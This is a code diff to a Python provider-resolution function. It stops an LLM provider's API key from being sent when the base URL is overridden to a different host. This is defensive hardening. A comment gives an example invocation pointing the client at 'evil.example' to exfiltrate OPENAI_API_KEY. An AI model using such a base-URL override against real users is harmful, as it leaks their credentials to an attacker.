@@ -80,7 +80,15 @@ def resolve_provider(
         return ProviderConfig(provider=provider, model=model_name, base_url=explicit_base_url, key_env=None)
 
     preset = providers_data["providers"][provider]
-    base_url = explicit_base_url if explicit_base_url else preset.get("base_url")
+    preset_base_url = preset.get("base_url")
+    base_url = explicit_base_url if explicit_base_url else preset_base_url
     key_env = preset.get("key_env")
+
+    # If the caller overrode the base_url away from this provider's own known
+    # endpoint, do not send that provider's API key to the new (arbitrary)
+    # host -- otherwise "openai/gpt-4o --base-url http://evil.example" would
+    # silently exfiltrate OPENAI_API_KEY to evil.example.
+    if explicit_base_url and preset_base_url and explicit_base_url.rstrip("/") != preset_base_url.rstrip("/"):
+        key_env = None
 
     return ProviderConfig(provider=provider, model=model_name, base_url=base_url, key_env=key_env)
